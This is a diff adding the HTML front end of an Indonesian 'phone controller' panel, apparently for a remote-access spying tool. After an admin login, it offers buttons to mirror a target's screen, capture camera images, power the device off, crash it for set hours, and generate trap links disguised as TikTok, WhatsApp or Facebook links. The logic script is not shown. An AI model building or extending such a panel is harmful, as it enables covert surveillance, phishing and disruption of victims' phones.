@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pengendali Hp By Galih</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div id="login-screen" class="overlay">
+        <div class="login-box">
+            <div class="icon-wrapper">
+                <img src="https://i.ibb.co/vzXfN6R/xenos-icon.png" alt="Xenos Icon" class="xenos-icon">
+            </div>
+            <h2>XENOS ACCESS</h2>
+            <p class="admin-tag">Admin: King Galih_XD</p>
+            
+            <div class="input-group">
+                <input type="text" id="user" placeholder="Username" autocomplete="off">
+                <input type="password" id="pass" placeholder="Password">
+            </div>
+            
+            <button onclick="login()">ACTIVATE SYSTEM</button>
+        </div>
+    </div>
+
+    <div id="main-app" class="hidden">
+        <header>
+            <h1 class="glitch" data-text="G-SYSTEM v3.0">G-SYSTEM v3.0</h1>
+            <div class="target-card">
+                <p>TARGET: <span id="target-name" class="highlight">Unknown</span></p>
+                <p>DEVICE: <span id="dev-model">-</span> | BAT: <span id="dev-bat">-</span></p>
+            </div>
+        </header>
+
+        <div class="control-panel">
+            <h3>PHYSICAL CONTROL</h3>
+            <div class="grid">
+                <button class="btn" onclick="cmd('POWER_TOGGLE')">ON/OFF DEVICE</button>
+                <button class="btn" onclick="cmd('FLASHLIGHT_ON')">SENTER ON/OFF</button>
+            </div>
+
+            <h3>SURVEILLANCE</h3>
+            <div class="grid">
+                <button class="btn" onclick="cmd('START_MIRRORING')">MIRRORING</button>
+                <button class="btn" onclick="cmd('CAPTURE_CAM')">FRONT/BACK CAM</button>
+            </div>
+
+            <h3>KING GALIH CRASH SYSTEM</h3>
+            <div class="crash-box">
+                <input type="number" id="crash-timer" placeholder="Durasi (Jam)">
+                <button class="btn-danger" onclick="crash()">EXECUTE CRASH</button>
+            </div>
+
+            <h3>LINK INJECTION (TRAP)</h3>
+            <div class="trap-box">
+                <input type="text" id="input-name" placeholder="Nama Target (Untuk Pengingat)">
+                <input type="text" id="fake-link" placeholder="Link Samaran (TikTok/WA/FB)">
+                <button class="btn-warn" onclick="genLink()">GENERATE TRAP LINK</button>
+            </div>
+        </div>
+
+        <div id="terminal">
+            <span class="cyan">[SYSTEM] Booting Xenos Protocol...</span><br>
+            <span class="cyan">[SYSTEM] Welcome, King Galih_XD. System Ready.</span>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+  </html>
